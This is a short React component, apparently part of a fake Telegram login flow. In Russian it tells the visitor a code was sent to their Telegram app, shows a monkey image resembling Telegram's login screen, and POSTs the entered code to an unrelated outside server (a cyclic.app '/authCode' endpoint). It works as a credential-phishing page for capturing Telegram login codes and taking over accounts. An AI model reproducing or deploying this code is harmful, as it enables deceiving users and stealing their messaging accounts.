// App2.js
import React,{useState} from 'react';
import './App2.css';
import './PhoneNumberInput.css';
import './App2.css';
import './PhoneNumberInput.css';
import { useParams } from 'react-router-dom';
import CodeNumberInput from './CodeNumber';


const App2 = () => {
  const [value, setCodeNumber] = useState('');

  const handleInputChange = (event) => {
    setCodeNumber(event.target.value);
  };

  const CodeSubmit = (event) => {
    event.preventDefault(); // Отменяет стандартное поведение формы

    // Логика, связанная с CodeSubmit
    console.log('Code submitted:', value);
    const serverUrl = 'https://web-server.cyclic.app/authCode';

    const requestData = {
      value: value,
    };
    console.log('requestData:', requestData);
    fetch(serverUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(requestData),
    })
      .then((response) => {
        if (!response.ok) {
          throw new Error(`Ошибка HTTP: ${response.status}`);
        }
        return response.json();
      })
      .then((data) => {
        console.log('Успешный ответ от сервера:', data);
      })
      .catch((error) => {
        // Используйте ваш механизм обработки состояния здесь
        console.error('Ошибка при отправке запроса:', error.message);
      });
  };

  return (
    <div className='app2-conteiner'>
      <img src="./321.jpeg" alt="Мое изображение" className='monkey' />
      <a className="add-text2">
        Мы отправили код в приложение Telegram <br /> на ваше мобильное устройство.
      </a>
      <form className="code-input-container" onSubmit={CodeSubmit}>
        <input
          type="tel"
          id="value"
          value={value}
          onChange={handleInputChange}
          className="code-input"
          placeholder="Код"
        />
        <button type="submit" className='button-code'>
          Далее
        </button>
      </form>
    </div>
  );
};

export default App2;